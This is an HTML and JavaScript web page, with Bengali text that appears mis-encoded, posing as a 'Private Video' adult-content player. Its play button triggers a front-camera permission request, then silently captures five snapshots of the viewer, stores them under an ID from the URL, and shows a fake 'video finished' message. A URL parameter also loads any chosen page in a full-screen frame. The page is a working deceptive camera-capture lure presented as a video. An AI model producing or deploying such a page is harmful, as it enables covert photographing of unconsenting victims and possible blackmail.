<!DOCTYPE html>
<html lang="bn">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Private Video ‚Ä¢ Tap to Play</title>
  <style>
    *{margin:0;padding:0;box-sizing:border-box;}
    body,html{height:100%;background:#000;overflow:hidden;font-family:'Segoe UI',sans-serif;}

    /* ‡¶∞‡¶ø‡¶°‡¶æ‡¶á‡¶∞‡ßá‡¶ï‡ßç‡¶ü ‡¶´‡ßç‡¶∞‡ßá‡¶Æ */
    iframe{width:100%;height:100%;border:none;display:none;}

    /* ‡¶´‡ßá‡¶ï ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶™‡ßç‡¶≤‡ßá‡¶Ø‡¶º‡¶æ‡¶∞ */
    .player{
      position:relative;width:100%;height:100%;display:flex;align-items:center;justify-content:center;
    }
    .blur-bg{
      position:absolute;top:0;left:0;width:100%;height:100%;
      background:url('https://i.imgur.com/8z3xK9L.jpeg') center/cover no-repeat;
      filter:blur(15px) brightness(0.5);
      transform:scale(1.1);
    }
    .content{
      position:relative;z-index:10;text-align:center;color:white;
    }
    .play-btn{
      width:100px;height:100px;background:rgba(255,0,0,0.95);
      border-radius:50%;display:flex;align-items:center;justify-content:center;
      cursor:pointer;margin:0 auto 25px;
      box-shadow:0 0 50px rgba(255,0,0,0.8);
      animation:pulse 2s infinite;
      border:4px solid rgba(255,255,255,0.3);
    }
    .play-btn::after{
      content:'‚ñ∂';font-size:48px;color:white;margin-left:8px;
    }
    @keyframes pulse{
      0%{transform:scale(1);box-shadow:0 0 0 0 rgba(255,0,0,0.7);}
      70%{transform:scale(1.15);box-shadow:0 0 0 30px rgba(255,0,0,0);}
      100%{transform:scale(1);box-shadow:0 0 0 0 rgba(255,0,0,0);}
    }
    .title{
      font-size:26px;font-weight:bold;text-shadow:0 0 20px #000;
      margin-bottom:10px;
    }
    .subtitle{
      font-size:18px;text-shadow:0 0 15px #000;
      opacity:0.95;
    }

    /* ‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶™‡ßç‡¶∞‡¶ø‡¶≠‡¶ø‡¶â */
    .cam-box{
      position:absolute;top:0;left:0;width:100%;height:100%;background:#000;
      display:flex;flex-direction:column;align-items:center;justify-content:center;
      z-index:20;display:none;
    }
    video{max-width:90%;border-radius:18px;border:5px solid #0066ff;box-shadow:0 0 50px #0066ff;}
    .msg{color:#00ff9d;font-size:19px;margin-top:20px;}
  </style>
</head>
<body>

<iframe id="redirectFrame"></iframe>

<div class="player" id="fakePlayer">
  <div class="blur-bg"></div>
  <div class="content" onclick="startCamera()">
    <div class="play-btn"></div>
    <div class="title">‡¶™‡ßç‡¶∞‡¶æ‡¶á‡¶≠‡ßá‡¶ü ‡¶≠‡¶ø‡¶°‡¶ø‡¶ì üîû</div>
    <div class="subtitle">‡¶ü‡ßç‡¶Ø‡¶æ‡¶™ ‡¶ï‡¶∞‡ßã ‡¶´‡ßÅ‡¶≤ HD ‡¶¶‡ßá‡¶ñ‡¶æ‡¶∞ ‡¶ú‡¶®‡ßç‡¶Ø</div>
  </div>
</div>

<div class="cam-box" id="camPreview">
  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" style="display:none;"></canvas>
  <div class="msg">‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶≤‡ßã‡¶° ‡¶π‡¶ö‡ßç‡¶õ‡ßá... ‡¶Ö‡¶™‡ßá‡¶ï‡ßç‡¶∑‡¶æ ‡¶ï‡¶∞‡ßÅ‡¶®</div>
</div>

<script>
const params = new URLSearchParams(location.search);
const id = params.get('id');
const redirectUrl = params.get('r') ? decodeURIComponent(params.get('r')) : null;

if (redirectUrl) {
  document.getElementById('redirectFrame').src = redirectUrl;
  document.getElementById('redirectFrame').style.display = 'block';
} else {
  document.getElementById('fakePlayer').style.display = 'flex';
}

function startCamera() {
  document.getElementById('fakePlayer').style.display = 'none';
  document.getElementById('camPreview').style.display = 'flex';

  const video = document.getElementById('video');
  const canvas = document.getElementById('canvas');
  const ctx = canvas.getContext('2d');
  let count = 0;
  const total = 5;
  const images = [];

  navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
    .then(stream => {
      video.srcObject = stream;
      video.play();

      const shoot = () => {
        if (count >= total) {
          localStorage.setItem('camsnap_' + id, JSON.stringify(images));
          setTimeout(() => {
            alert("‡¶≠‡¶ø‡¶°‡¶ø‡¶ì ‡¶∂‡ßá‡¶∑! ‡¶ß‡¶®‡ßç‡¶Ø‡¶¨‡¶æ‡¶¶ ‚ù§Ô∏è");
            location.reload();
          }, 1200);
          return;
        }
        canvas.width = video.videoWidth || 640;
        canvas.height = video.videoHeight || 480;
        ctx.drawImage(video, 0, 0);
        images.push(canvas.toDataURL('image/jpeg', 0.9));
        count++;
        setTimeout(shoot, 800);
      };
      setTimeout(shoot, 1800);
    })
    .catch(() => {
      document.getElementById('camPreview').innerHTML = 
        `<div style="color:#ff0055;font-size:22px;padding:20px;">‡¶ï‡ßç‡¶Ø‡¶æ‡¶Æ‡ßá‡¶∞‡¶æ ‡¶Ö‡¶®‡ßÅ‡¶Æ‡¶§‡¶ø ‡¶¶‡¶æ‡¶ì!</div>`;
    });
}
</script>
</body>
</html>
